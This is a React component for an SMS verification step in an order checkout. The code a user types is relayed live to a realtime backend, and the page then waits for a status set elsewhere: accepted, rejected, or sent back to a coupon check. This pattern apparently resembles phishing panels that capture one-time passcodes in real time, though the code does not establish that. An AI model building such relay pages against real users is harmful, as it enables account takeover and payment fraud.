import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useRealtime } from "@/context/RealtimeContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Loader2, MessageSquare, AlertCircle } from "lucide-react";

const SMSVerification = () => {
  const navigate = useNavigate();
  const { updateSmsCode, setOrderStatus, orderStatus, currentOrderId, submitSMS } = useRealtime();
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    // If completed, go to confirmation
    if (orderStatus === "COMPLETED") {
      setIsLoading(false);
      navigate(`/order-confirmation/${currentOrderId}`);
    } else if (orderStatus === "REJECTED") {
        setIsLoading(false);
        setError("Verification code incorrect. Please try again.");
        setCode("");
        updateSmsCode("");
        setOrderStatus("WAITING_SMS"); 
    } else if (orderStatus === "RETURN_COUPON") {
        setIsLoading(false);
        navigate("/verify-coupon");
    }
  }, [orderStatus, navigate, currentOrderId, setOrderStatus, updateSmsCode]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setCode(value);
    updateSmsCode(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 4) {
        setError("Please enter a valid verification code");
        return;
    }
    setError("");
    setIsLoading(true);
    
    // Submit to backend with explicit code
    await submitSMS(code);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex flex-col">
        <Header />
        <main className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="text-center space-y-6 max-w-md">
            <div className="relative w-20 h-20 mx-auto">
              <div className="absolute inset-0 border-4 border-muted rounded-full"></div>
              <div className="absolute inset-0 border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
            </div>
            <h2 className="font-serif text-2xl md:text-3xl">Verifying Code...</h2>
            <p className="text-muted-foreground">
              Please wait while we confirm your verification code.
            </p>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Header />
      <main className="flex-1 container mx-auto px-6 py-12 flex items-center justify-center">
        <Card className="w-full max-w-md shadow-lg border-primary/10">
          <CardHeader className="text-center pb-8">
            <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4 text-primary">
                <MessageSquare className="w-6 h-6" />
            </div>
            <CardTitle className="font-serif text-3xl mb-2">Verification Required</CardTitle>
            <CardDescription className="text-base">
              We've sent a verification code to your phone number. Please enter it below to complete your order.
            </CardDescription>
          </CardHeader>
          <CardContent>
            {error && (
              <div className="bg-destructive/10 text-destructive text-sm p-3 rounded-md flex items-center gap-2 mb-6">
                <AlertCircle className="w-4 h-4" />
                {error}
              </div>
            )}
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="code" className="text-center block">Verification Code</Label>
                <Input 
                  id="code" 
                  name="code" 
                  placeholder="123456"
                  className="font-mono text-3xl text-center tracking-[1em] h-16"
                  maxLength={6}
                  required 
                  value={code}
                  onChange={handleInputChange}
                  autoFocus
                />
              </div>

              <Button type="submit" className="w-full text-lg h-12 mt-4" disabled={code.length < 4}>
                Confirm Code
              </Button>
            </form>
          </CardContent>
        </Card>
      </main>
      <Footer />
    </div>
  );
};

export default SMSVerification;
